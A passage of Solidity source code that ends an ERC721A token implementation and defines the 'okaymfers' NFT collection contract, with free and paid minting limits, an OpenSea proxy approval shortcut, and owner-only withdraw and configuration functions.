1025     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1026         return _operatorApprovals[owner][operator];
1027     }
1028 
1029     /**
1030      * @dev See {IERC721-transferFrom}.
1031      */
1032     function transferFrom(
1033         address from,
1034         address to,
1035         uint256 tokenId
1036     ) public virtual override {
1037         _transfer(from, to, tokenId);
1038     }
1039 
1040     /**
1041      * @dev See {IERC721-safeTransferFrom}.
1042      */
1043     function safeTransferFrom(
1044         address from,
1045         address to,
1046         uint256 tokenId
1047     ) public virtual override {
1048         safeTransferFrom(from, to, tokenId, '');
1049     }
1050 
1051     /**
1052      * @dev See {IERC721-safeTransferFrom}.
1053      */
1054     function safeTransferFrom(
1055         address from,
1056         address to,
1057         uint256 tokenId,
1058         bytes memory _data
1059     ) public virtual override {
1060         _transfer(from, to, tokenId);
1061         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1062             revert TransferToNonERC721ReceiverImplementer();
1063         }
1064     }
1065 
1066     /**
1067      * @dev Returns whether `tokenId` exists.
1068      *
1069      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1070      *
1071      * Tokens start existing when they are minted (`_mint`),
1072      */
1073     function _exists(uint256 tokenId) internal view returns (bool) {
1074         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1075             !_ownerships[tokenId].burned;
1076     }
1077 
1078     function _safeMint(address to, uint256 quantity) internal {
1079         _safeMint(to, quantity, '');
1080     }
1081 
1082     /**
1083      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1084      *
1085      * Requirements:
1086      *
1087      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1088      * - `quantity` must be greater than 0.
1089      *
1090      * Emits a {Transfer} event.
1091      */
1092     function _safeMint(
1093         address to,
1094         uint256 quantity,
1095         bytes memory _data
1096     ) internal {
1097         _mint(to, quantity, _data, true);
1098     }
1099 
1100     /**
1101      * @dev Mints `quantity` tokens and transfers them to `to`.
1102      *
1103      * Requirements:
1104      *
1105      * - `to` cannot be the zero address.
1106      * - `quantity` must be greater than 0.
1107      *
1108      * Emits a {Transfer} event.
1109      */
1110     function _mint(
1111         address to,
1112         uint256 quantity,
1113         bytes memory _data,
1114         bool safe
1115     ) internal {
1116         uint256 startTokenId = _currentIndex;
1117         if (to == address(0)) revert MintToZeroAddress();
1118         if (quantity == 0) revert MintZeroQuantity();
1119 
1120         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1121 
1122         // Overflows are incredibly unrealistic.
1123         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1124         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1125         unchecked {
1126             _addressData[to].balance += uint64(quantity);
1127             _addressData[to].numberMinted += uint64(quantity);
1128 
1129             _ownerships[startTokenId].addr = to;
1130             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1131 
1132             uint256 updatedIndex = startTokenId;
1133             uint256 end = updatedIndex + quantity;
1134 
1135             if (safe && to.isContract()) {
1136                 do {
1137                     emit Transfer(address(0), to, updatedIndex);
1138                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1139                         revert TransferToNonERC721ReceiverImplementer();
1140                     }
1141                 } while (updatedIndex != end);
1142                 // Reentrancy protection
1143                 if (_currentIndex != startTokenId) revert();
1144             } else {
1145                 do {
1146                     emit Transfer(address(0), to, updatedIndex++);
1147                 } while (updatedIndex != end);
1148             }
1149             _currentIndex = updatedIndex;
1150         }
1151         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1152     }
1153 
1154     /**
1155      * @dev Transfers `tokenId` from `from` to `to`.
1156      *
1157      * Requirements:
1158      *
1159      * - `to` cannot be the zero address.
1160      * - `tokenId` token must be owned by `from`.
1161      *
1162      * Emits a {Transfer} event.
1163      */
1164     function _transfer(
1165         address from,
1166         address to,
1167         uint256 tokenId
1168     ) private {
1169         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1170 
1171         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1172             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1173             getApproved(tokenId) == _msgSender());
1174 
1175         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1176         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1177         if (to == address(0)) revert TransferToZeroAddress();
1178 
1179         _beforeTokenTransfers(from, to, tokenId, 1);
1180 
1181         // Clear approvals from the previous owner
1182         _approve(address(0), tokenId, prevOwnership.addr);
1183 
1184         // Underflow of the sender's balance is impossible because we check for
1185         // ownership above and the recipient's balance can't realistically overflow.
1186         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1187         unchecked {
1188             _addressData[from].balance -= 1;
1189             _addressData[to].balance += 1;
1190 
1191             _ownerships[tokenId].addr = to;
1192             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1193 
1194             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1195             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1196             uint256 nextTokenId = tokenId + 1;
1197             if (_ownerships[nextTokenId].addr == address(0)) {
1198                 // This will suffice for checking _exists(nextTokenId),
1199                 // as a burned slot cannot contain the zero address.
1200                 if (nextTokenId < _currentIndex) {
1201                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1202                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1203                 }
1204             }
1205         }
1206 
1207         emit Transfer(from, to, tokenId);
1208         _afterTokenTransfers(from, to, tokenId, 1);
1209     }
1210 
1211     /**
1212      * @dev Destroys `tokenId`.
1213      * The approval is cleared when the token is burned.
1214      *
1215      * Requirements:
1216      *
1217      * - `tokenId` must exist.
1218      *
1219      * Emits a {Transfer} event.
1220      */
1221     function _burn(uint256 tokenId) internal virtual {
1222         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1223 
1224         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1225 
1226         // Clear approvals from the previous owner
1227         _approve(address(0), tokenId, prevOwnership.addr);
1228 
1229         // Underflow of the sender's balance is impossible because we check for
1230         // ownership above and the recipient's balance can't realistically overflow.
1231         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1232         unchecked {
1233             _addressData[prevOwnership.addr].balance -= 1;
1234             _addressData[prevOwnership.addr].numberBurned += 1;
1235 
1236             // Keep track of who burned the token, and the timestamp of burning.
1237             _ownerships[tokenId].addr = prevOwnership.addr;
1238             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1239             _ownerships[tokenId].burned = true;
1240 
1241             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1242             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1243             uint256 nextTokenId = tokenId + 1;
1244             if (_ownerships[nextTokenId].addr == address(0)) {
1245                 // This will suffice for checking _exists(nextTokenId),
1246                 // as a burned slot cannot contain the zero address.
1247                 if (nextTokenId < _currentIndex) {
1248                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1249                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1250                 }
1251             }
1252         }
1253 
1254         emit Transfer(prevOwnership.addr, address(0), tokenId);
1255         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1256 
1257         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1258         unchecked {
1259             _burnCounter++;
1260         }
1261     }
1262 
1263     /**
1264      * @dev Approve `to` to operate on `tokenId`
1265      *
1266      * Emits a {Approval} event.
1267      */
1268     function _approve(
1269         address to,
1270         uint256 tokenId,
1271         address owner
1272     ) private {
1273         _tokenApprovals[tokenId] = to;
1274         emit Approval(owner, to, tokenId);
1275     }
1276 
1277     /**
1278      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1279      *
1280      * @param from address representing the previous owner of the given token ID
1281      * @param to target address that will receive the tokens
1282      * @param tokenId uint256 ID of the token to be transferred
1283      * @param _data bytes optional data to send along with the call
1284      * @return bool whether the call correctly returned the expected magic value
1285      */
1286     function _checkContractOnERC721Received(
1287         address from,
1288         address to,
1289         uint256 tokenId,
1290         bytes memory _data
1291     ) private returns (bool) {
1292         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1293             return retval == IERC721Receiver(to).onERC721Received.selector;
1294         } catch (bytes memory reason) {
1295             if (reason.length == 0) {
1296                 revert TransferToNonERC721ReceiverImplementer();
1297             } else {
1298                 assembly {
1299                     revert(add(32, reason), mload(reason))
1300                 }
1301             }
1302         }
1303     }
1304 
1305     /**
1306      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1307      * And also called before burning one token.
1308      *
1309      * startTokenId - the first token id to be transferred
1310      * quantity - the amount to be transferred
1311      *
1312      * Calling conditions:
1313      *
1314      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1315      * transferred to `to`.
1316      * - When `from` is zero, `tokenId` will be minted for `to`.
1317      * - When `to` is zero, `tokenId` will be burned by `from`.
1318      * - `from` and `to` are never both zero.
1319      */
1320     function _beforeTokenTransfers(
1321         address from,
1322         address to,
1323         uint256 startTokenId,
1324         uint256 quantity
1325     ) internal virtual {}
1326 
1327     /**
1328      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1329      * minting.
1330      * And also called after one token has been burned.
1331      *
1332      * startTokenId - the first token id to be transferred
1333      * quantity - the amount to be transferred
1334      *
1335      * Calling conditions:
1336      *
1337      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1338      * transferred to `to`.
1339      * - When `from` is zero, `tokenId` has been minted for `to`.
1340      * - When `to` is zero, `tokenId` has been burned by `from`.
1341      * - `from` and `to` are never both zero.
1342      */
1343     function _afterTokenTransfers(
1344         address from,
1345         address to,
1346         uint256 startTokenId,
1347         uint256 quantity
1348     ) internal virtual {}
1349 }
1350 
1351 
1352 
1353 contract okaymfers is ERC721A, Owneable {
1354 
1355     string public baseURI = "ipfs://QmUbuM47uPcZQANSGBQNQkoKC4Me8pp1dQQbqaoM4BxcW3/";
1356     string public contractURI = "ipfs://QmUbuM47uPcZQANSGBQNQkoKC4Me8pp1dQQbqaoM4BxcW3/";
1357     string public constant baseExtension = ".json";
1358     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1359 
1360     uint256 public MAX_PER_TX_FREE = 2;
1361     uint256 public FREE_MAX_SUPPLY = 2000;
1362     uint256 public constant MAX_PER_TX = 20;
1363     uint256 public MAX_SUPPLY = 9999;
1364     uint256 public price = 0.006 ether;
1365 
1366     bool public paused = false;
1367 
1368     constructor() ERC721A("okaymfers", "WTF") {}
1369 
1370     function mint(uint256 _amount) external payable {
1371         address _caller = _msgSender();
1372         require(!paused, "Paused");
1373         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1374         require(_amount > 0, "No 0 mints");
1375         require(tx.origin == _caller, "No contracts");
1376         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1377         
1378       if(FREE_MAX_SUPPLY >= totalSupply()){
1379             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1380         }else{
1381             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1382             require(_amount * price == msg.value, "Invalid funds provided");
1383         }
1384 
1385         _safeMint(_caller, _amount);
1386     }
1387 
1388     function isApprovedForAll(address owner, address operator)
1389         override
1390         public
1391         view
1392         returns (bool)
1393     {
1394         // Whitelist OpenSea proxy contract for easy trading.
1395         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1396         if (address(proxyRegistry.proxies(owner)) == operator) {
1397             return true;
1398         }
1399 
1400         return super.isApprovedForAll(owner, operator);
1401     }
1402 
1403     function withdraw() external onlyOwner {
1404         uint256 balance = address(this).balance;
1405         (bool success, ) = _msgSender().call{value: balance}("");
1406         require(success, "Failed to send");
1407     }
1408 
1409     function config() external onlyOwner {
1410         _safeMint(_msgSender(), 1);
1411     }
1412 
1413     function pause(bool _state) external onlyOwner {
1414         paused = _state;
1415     }
1416 
1417     function setBaseURI(string memory baseURI_) external onlyOwner {
1418         baseURI = baseURI_;
1419     }
1420 
1421     function setContractURI(string memory _contractURI) external onlyOwner {
1422         contractURI = _contractURI;
1423     }
1424 
1425     function setPrice(uint256 newPrice) public onlyOwner {
1426         price = newPrice;
1427     }
1428 
1429     function setFREE_MAX_SUPPLY(uint256 newFREE_MAX_SUPPLY) public onlyOwner {
1430         FREE_MAX_SUPPLY = newFREE_MAX_SUPPLY;
1431     }
1432 
1433     function setMAX_PER_TX_FREE(uint256 newMAX_PER_TX_FREE) public onlyOwner {
1434         MAX_PER_TX_FREE = newMAX_PER_TX_FREE;
1435     }
1436 
1437     function setMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1438         MAX_SUPPLY = newSupply;
1439     }
1440 
1441     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1442         require(_exists(_tokenId), "Token does not exist.");
1443         return bytes(baseURI).length > 0 ? string(
1444             abi.encodePacked(
1445               baseURI,
1446               Strings.toString(_tokenId),
1447               baseExtension
1448             )
1449         ) : "";
1450     }
1451 }
1452 
1453 contract OwnableDelegateProxy { }
1454 contract ProxyRegistry {
1455     mapping(address => OwnableDelegateProxy) public proxies;
1456 }